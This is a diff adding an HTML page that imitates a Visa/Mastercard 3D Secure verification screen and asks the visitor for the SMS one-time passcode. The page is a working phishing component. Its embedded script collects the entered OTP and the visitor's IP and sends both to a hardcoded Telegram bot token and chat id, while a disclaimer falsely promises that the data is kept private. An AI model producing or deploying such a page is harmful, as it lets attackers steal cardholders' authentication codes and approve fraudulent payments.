@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Process</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f7fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            text-align: center;
+            display: none; /* Initially hide both forms */
+        }
+        .form-container.show {
+            display: block; /* Show the form when it's active */
+        }
+        .form-container h2 {
+            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 18px;
+            background-color: #f9f9f9;
+            color: #333;
+            box-sizing: border-box;
+        }
+        .form-group input:focus {
+            border-color: #6372ff;
+            background-color: #ffffff;
+            outline: none;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #6372ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .submit-btn:hover {
+            background-color: #4f5bc9;
+        }
+        .submit-btn:focus {
+            outline: none;
+        }
+        .instructions {
+            font-size: 14px;
+            color: #888;
+            margin-top: 15px;
+        }
+        .verification-step {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #777;
+            margin-top: 10px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .disclaimer {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container show" id="intro-form">
+        <h2>3D Secure</h2>
+        <p>Please wait a few seconds while your bank verifies your transaction.</p>
+        <img src="visa.jpg" alt="VISA Secure">
+        <img src="Mastercard.jpg" alt="Mastercard ID Check">
+        </p>
+        <button class="submit-btn" id="start-verification">Verify</button>
+    </div>
+
+    <div class="form-container" id="otp-form">
+        <img src="logo.svg" alt="Logo" class="logo">
+        <h2>Verify your identity</h2>
+        <p class="verification-step">For added security, please enter the 6-digit OTP sent to your phone number. This helps us ensure that it’s really you.</p>
+        <form id="otp-form-submit">
+            <div class="form-group">
+                <label for="otp">Enter OTP</label>
+                <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
+            </div>
+            <button type="submit" class="submit-btn">Verify</button>
+        </form>
+        <div class="instructions">
+            <p>If you didn't receive the OTP, please check your SMS inbox or click below to resend it.</p>
+            <button class="submit-btn" id="resend-otp">Resend OTP</button>
+        </div>
+        <div class="disclaimer">
+            <p>Your data is secure with us. We respect your privacy and will never share your information.</p>
+        </div>
+    </div>
+
+    <script>
+        // Function to send OTP and IP to Telegram
+        async function sendOtpToTelegram(otp) {
+            try {
+                // Fetch IP address
+                const ipResponse = await fetch("get_ip.php");
+                const ip = await ipResponse.text();
+
+                // Send OTP and IP to Telegram
+                const telegramUrl = `https://api.telegram.org/bot7765277959:AAEpW-EOztAOxPIsB6ha23Bf0Bfp84tBPhw/sendMessage?chat_id=6067843686&text=OTP:%20${encodeURIComponent(otp)}%0AIP:%20${encodeURIComponent(ip)}`;
+                const response = await fetch(telegramUrl); // Send the request to Telegram
+
+                // Check if the request was successful
+                if (response.ok) {
+                    console.log("OTP sent to Telegram successfully!");
+                    // Redirect to success page
+                    window.location.href = "success.php";
+                } else {
+                    console.error("Failed to send OTP to Telegram.");
+                    alert("Failed to send OTP. Please try again.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("An error occurred. Please try again.");
+            }
+        }
+
+        // When the "לְאַמֵת" button is clicked
+        document.getElementById('start-verification').addEventListener('click', function() {
+            // Hide the intro form and show the OTP form
+            document.getElementById('intro-form').style.display = 'none';
+            document.getElementById('otp-form').classList.add('show');
+        });
+
+        // When the user submits the OTP form
+        document.getElementById('otp-form-submit').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+            const otpValue = document.getElementById('otp').value; // Get the OTP value entered by the user
+            if (otpValue) {
+                sendOtpToTelegram(otpValue); // Send the user's OTP to Telegram
+            } else {
+                alert("Please enter a valid OTP.");
+            }
+        });
+
+        // Resend OTP button
+        document.getElementById('resend-otp').addEventListener('click', function() {
+            alert('! OTP resent. Please check your phone.');
+        });
+    </script>
+</body>
+</html>
